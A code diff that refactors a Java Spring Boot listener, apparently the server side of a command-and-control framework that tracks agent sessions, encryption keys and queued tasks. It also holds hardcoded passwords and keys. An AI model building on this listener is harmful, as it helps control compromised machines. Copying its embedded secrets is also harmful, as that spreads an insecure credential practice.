@@ -95,6 +95,12 @@ import java.text.SimpleDateFormat;
 @SpringBootApplication(exclude = { SecurityAutoConfiguration.class })
 public class ListenerApplication {
 
+	private final config configuration;
+
+	public ListenerApplication(config configuration) {
+		this.configuration = configuration;
+	}
+
 	public static void main(String[] args) {
 		SpringApplication.run(ListenerApplication.class, args);
 	}
@@ -104,8 +110,10 @@ public class ListenerApplication {
 	{
 		static noceboApi.security sapi = new noceboApi.security();
 		static noceboApi.noceboApiUtil napi = new noceboApi.noceboApiUtil();
-		static endpointConfig epc = new endpointConfig();
+		static Hashtable<String,session> sessionTable = new Hashtable();
 	
+			
+
 		static class endpointConfig
 		{
 			static String passwd = "T__+Pmv.REW=u9iXBB-";
@@ -115,7 +123,7 @@ public class ListenerApplication {
 			static String apiPass = "882fb2a4-23ed-46c3-b005-83b71c554845";
 			static String agentKey = "q8uf6,p2m1@31395aO+g+9592_4891lS";
 			static String secretKey = "NmNkMGUyMTk4ZmRkNDU2MzdhOTAxZDYwMmM5NGY5ZTIyMzIzNDhmZDNiNmVkMDE5ZmI3ZjA3MWUwODk5Y2EyZDNhNTg5ZjEz";
-			static Hashtable<String,session> sessionTable = new Hashtable();
+			
 		}
 
 		@PostMapping("/60000")
@@ -124,7 +132,7 @@ public class ListenerApplication {
 			session sessionData;
 			String currentKey;
 
-			if (!epc.sessionTable.containsKey(idCookie))
+			if (!sessionTable.containsKey(idCookie))
 			{
 				sessionData = new session();
 				sessionData.nonce = idCookie.substring(0,12).replace("-","");
@@ -135,7 +143,7 @@ public class ListenerApplication {
 			}
 			else
 			{
-				sessionData = (session) epc.sessionTable.get(idCookie);
+				sessionData = (session) sessionTable.get(idCookie);
 				currentKey = sessionData.encKey;
 			}
 
@@ -192,7 +200,7 @@ public class ListenerApplication {
 			sessionData.downstream = downstreamData;
 			sessionData.nonce = newNonce;
 			sessionData.tasks = new ArrayList();
-			epc.sessionTable.put(idCookie,sessionData);
+			sessionTable.put(idCookie,sessionData);
 
 			return retrData;
 		}
@@ -202,14 +210,14 @@ public class ListenerApplication {
 		{
 			session sessionData;
 
-			if (!epc.sessionTable.keySet().contains(idCookie))
+			if (!sessionTable.keySet().contains(idCookie))
 			{
 				//bad cookie
 				return "error.0x73657373";
 			}
 			else
 			{
-				sessionData  = (session) epc.sessionTable.get(idCookie);
+				sessionData  = (session) sessionTable.get(idCookie);
 				if (!sessionData.cookie.equals(authCookie))
 				{
 					
@@ -317,13 +325,13 @@ public class ListenerApplication {
 			ArrayList<session> sessionData = new ArrayList();
 			boolean foundDownstream = false;
 
-			if (!epc.sessionTable.containsKey((String) requestData.get("uuid")))
+			if (!sessionTable.containsKey((String) requestData.get("uuid")))
 			{
-				Enumeration<String> k = epc.sessionTable.keys();
+				Enumeration<String> k = sessionTable.keys();
 				while (k.hasMoreElements())
 				{
 					String sessionKey = k.nextElement();
-					session tempSessionData = (session) epc.sessionTable.get(sessionKey);
+					session tempSessionData = (session) sessionTable.get(sessionKey);
 					if (tempSessionData.downstream.contains((String) requestData.get("uuid")))
 					{
 						sessionData.add(tempSessionData);
@@ -337,7 +345,7 @@ public class ListenerApplication {
 			}
 			else
 			{
-				sessionData.add((session) epc.sessionTable.get((String) requestData.get("uuid")));
+				sessionData.add((session) sessionTable.get((String) requestData.get("uuid")));
 			}
 			
 
@@ -370,11 +378,11 @@ public class ListenerApplication {
 			//put authenticator in front
 			ArrayList<String> data = new ArrayList<String>();
 
-			Enumeration<String> k = epc.sessionTable.keys();
+			Enumeration<String> k = sessionTable.keys();
 			while (k.hasMoreElements())
 			{
 				String sessionKey = k.nextElement();
-				session sessionData = (session) epc.sessionTable.get(sessionKey);
+				session sessionData = (session) sessionTable.get(sessionKey);
 				Hashtable sessionRepresentative = new Hashtable();
 
 				sessionRepresentative.put("tasks",String.valueOf(sessionData.tasks.size()));
